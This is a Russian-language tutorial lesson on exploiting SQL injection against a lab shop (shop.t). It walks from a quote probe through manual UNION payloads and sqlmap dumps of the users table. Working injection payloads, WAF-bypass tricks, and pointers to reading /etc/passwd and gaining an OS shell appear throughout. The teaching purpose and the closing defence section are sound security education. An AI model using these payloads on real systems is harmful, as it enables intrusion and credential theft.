## Задача

У тебя есть подозрение на SQL-инъекцию в параметре `id` интернет-магазина. Хочется побыстрее вытащить таблицу пользователей. Вопрос новичка: «какую команду набрать?» — и вот здесь кроется ловушка. Если сразу запустить автоматический сканер на максимальных настройках, можно либо получить ложное «всё чисто», либо нашуметь и потратить впустую целый прогон. Правильный вопрос другой: **что я уже знаю об этой точке и какой следующий шаг это знание открывает?**

Этот урок — не справочник команд, а маршрут: от подозрения к дампу, где на каждом шаге ты осознанно выбираешь между автоматикой и работой руками.

## Данные, с которыми работаем

Наш объект — тот же магазин, что и в прошлых уроках: `http://shop.t/product?id=10`. Есть cookie сессии, которую мы уже умеем носить в curl. Первая проба — одиночная кавычка:

```
$ curl -s "http://shop.t/product?id=10'" | grep -i syntax
You have an error in your SQL syntax; check the manual ... near ''10'' at line 1
```

Ошибка MySQL. Это уже не «подозрение», а факт: обработка параметра неаккуратна. Запомним — контекст числовой, но кавычка ломает запрос.

## Пробуем в лоб

Наивный путь — открыть sqlmap на `-u` и ждать. Минус в том, что `-u` не переносит cookie, тело и заголовки: сканер пойдёт без сессии и, скорее всего, получит редирект на логин. Поэтому первым делом сохраняем **реальный** запрос из Burp (правый клик → *Save item*) в файл `request.txt`. В нём уже есть метод, cookie и тело.

```
$ sqlmap -r request.txt -p id --batch --level 3 --risk 2 --dbms=mysql
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0 AND error-based' injectable
[INFO] the back-end DBMS is MySQL
```

> **`--level`** — сколько мест тестировать (1 = только GET/POST-параметры, 5 = ещё и заголовки). **`--risk`** — насколько агрессивны payload (3 может менять данные). **`--technique`** — какие техники разрешены: `B`oolean, `E`rror, `U`nion, `S`tacked, `T`ime, `Q`uery.

Строка `is injectable` — это **кандидат**, а не доказательство. Сканер мог ошибиться на кастомной обработке ошибок. Дальше — руками.

## Приём: ручной workflow

Автоматика слепа к нестандартным контекстам (JSON, вложенные параметры, вторая производная). Ручной маршрут такой:

1. **Определить число колонок** — `ORDER BY n`, пока не появится ошибка.
2. **Найти отражаемую колонку** — `UNION SELECT 1,2,3`.
3. **Выбрать технику** — UNION/error, если данные видны; blind/OOB, если ответ не меняется.

```
$ curl -s "http://shop.t/product?id=10 ORDER BY 3-- -"   # ok
$ curl -s "http://shop.t/product?id=10 ORDER BY 4-- -"   # ошибка -> 3 колонки
$ curl -s "http://shop.t/product?id=-1 UNION SELECT 1,2,3-- -"
... 2 ...
```

Отражается вторая колонка. Подставляем туда запрос:

```
$ curl -s "http://shop.t/product?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"
... users,products,orders,sessions ...
```

## Полный прогон от начала до конца

Теперь, когда точка подтверждена вручную, можно смело доверить объём автоматике — она быстрее соберёт все таблицы и колонки.

```
$ sqlmap -r request.txt -p id --batch --dbms=mysql --dbs
available databases [3]:
[*] information_schema
[*] shop
[*] mysql

$ sqlmap -r request.txt -p id --batch -D shop --tables
Database: shop
[4 tables]
+----------+
| orders   |
| products |
| sessions |
| users    |
+----------+

$ sqlmap -r request.txt -p id --batch -D shop -T users -C id,username,password --dump
+----+----------+--------------------------------------------------------------+
| id | username | password                                                     |
+----+----------+--------------------------------------------------------------+
| 1  | admin    | $2y$10$wH8Q...                                               |
+----+----------+--------------------------------------------------------------+
```

Хэш bcrypt (`$2y$10$...`) — не «пароль», а его необратимая свёртка. Его **крэкают офлайн** (`hashcat -m 3200`), а не перебирают через форму логина: онлайн-брутфорс спалит аккаунт и ничего не даст.

Финальный аккорд — минимальный PoC, который воспроизводит утечку одной командой:

```
$ curl -s "http://shop.t/product?id=-1 UNION SELECT 1,concat(username,':',password),3 FROM users-- -"
... admin:$2y$10$wH8Q... ...
```

Вот это и идёт в отчёт: не «sqlmap сказал vulnerable», а одна команда, которая при повторе даёт те же данные.

## Если не сработало

- **Сканер молчит, а инъекция есть.** Значит, нестандартный контекст: параметр в JSON, заголовке или вторая производная (payload срабатывает в другом запросе). Возвращайся к ручному разбору.
- **Стоит WAF.** Порядок обхода: пойми, что фильтруется (кавычка? пробел? `UNION`?), затем обходи по одному токену. Пробелы — `/**/`, `%09`; ключевые слова — регистр и `UN/**/ION`; для sqlmap — `--tamper=space2comment,between`.
- **Ответ вообще не меняется.** Пробуй time-based (`--technique=T`), а если асинхронный обработчик съедает задержку — OOB-канал (DNS/HTTP на твой listener).
- **Нужна тишина.** `--delay=1` и `--random-agent` снижают шум и помогают против rate-limit.
- **Результат «залип» на старом.** sqlmap кэширует сессию; если ты поменял запрос, а вывод не меняется — добавь `--flush-session` и прогони заново.
- **Параметр в JSON или заголовке.** Сканер его часто не видит; укажи `--level 5` либо тестируй руками, подставляя payload прямо в тело.

## Что мы теперь знаем

- Маршрут всегда один: обнаружение → классификация СУБД → авто-чек → ручное подтверждение → дамп → PoC.
- `sqlmap -r` переносит cookie, тело и заголовки — это быстрее и точнее, чем `-u`.
- Сканер даёт **кандидата**; доказательство — минимальный ручной запрос.
- Начинай с дефолтного `--level/--risk`, повышай осознанно.
- Хэши крэкают офлайн, а не брутфорсят онлайн.

## На что смотреть дальше

- **`--privileges`/`--is-dba`** — DBA открывает `--file-read`, `--file-write` и `--os-shell`.
- **`--file-read=/etc/passwd`** — читаем конфиги с кредами.
- **`--os-shell`** — RCE: MySQL `INTO OUTFILE`+UDF, MSSQL `xp_cmdshell`, PostgreSQL `COPY TO PROGRAM`.
- **Ложное срабатывание** — кастомная обработка ошибок иногда выглядит как инъекция; проверяй руками.
- **Не долби цель** — линейный перебор в blind убивает время; используй бинарный поиск.

## Разбор: ручной workflow против автопилота

sqlmap мощный, но слепой: он не знает контекста твоей цели и может не найти то, что видно глазами. Поэтому правильный порядок — сначала ручная разведка, потом автоматизация. Ручной шаг отвечает на вопросы: какой это СУБД, какой контекст инъекции, есть ли фильтр. Только после этого sqlmap получает точную цель (`-r request.txt -p param --dbms=...`), и его результат осмысленный, а не «не найдено».

Ручная проверка начинается с одного символа. Кавычка, скобка, обратный слэш — смотри, меняется ли ответ: код, размер, текст ошибки, время. Отклонение — это сигнал. Затем уточняешь контекст: закрыта ли строка кавычкой, есть ли скобки, работает ли комментарий. Это определяет форму payload'а.

Только потом подключаешь инструмент и ограничиваешь его: `--technique` под найденный канал, `--level`/`--risk` под задачу, `--dbms` чтобы не тратить время на чужие диалекты. Автопилот без ручного контекста даёт много ложных «нет» и лишний шум на сервере.

## Частые вопросы

**«sqlmap говорит „not injectable“, а рукой видно отклонение.»** Значит канал нестандартный: нестандартный контекст, WAF, JSON-тело или инъекция во втором порядке. Уточни контекст руками и передай sqlmap точный запрос и параметр, иногда с `--tamper` для обхода фильтра.

**«Как не положить сервер?»** Ограничь `--threads 1`, используй `--delay` и не запускай `--risk 3` на проде. Инъекция с `DROP` или массовым `UPDATE` — только по согласованию.

**«Когда ручной подход важнее автопилота?»** На слепых каналах и на кастомных API, где sqlmap не понимает формат. Там ручное сравнение ответов и time-канал дают результат, недостижимый для инструмента.

## Защита

Единственная надёжная мера — параметризованные запросы на уровне драйвера БД. Никакая фильтрация ввода не заменяет привязку параметров. Дополнительно: минимальные права для аккаунта приложения, скрытие ошибок СУБД от клиента, WAF как эшелон, а не как основная защита. Регулярный SAST/DAST ищет склейки строк в коде до того, как их найдёт sqlmap.

## Куда дальше

В следующем уроке мы возьмём консольные инструменты, на которых стоит вся эта работа: `curl`, `HTTPie`, `netcat`, `socat` и `jq`. А пока главное запомни: **автоматика — для объёма, руки — для доказательства**; сначала подтверди точку сам, потом доверяй сканеру перечисление.

## Где пригодится

- **CTF (Web):** быстрый выбор «авто или руками» экономит время на решение; флаг часто в таблице `flags`.
- **Bug bounty:** минимальный PoC и обход фильтров вручную повышают шанс, что баг примут как critical.
- **Пентест:** единый маршрут от обнаружения до эскалации с доказательствами для каждого шага.
- **Работа (AppSec):** понимание, где автоматика слепа, помогает точно оценивать реальную эксплуатируемость находок.
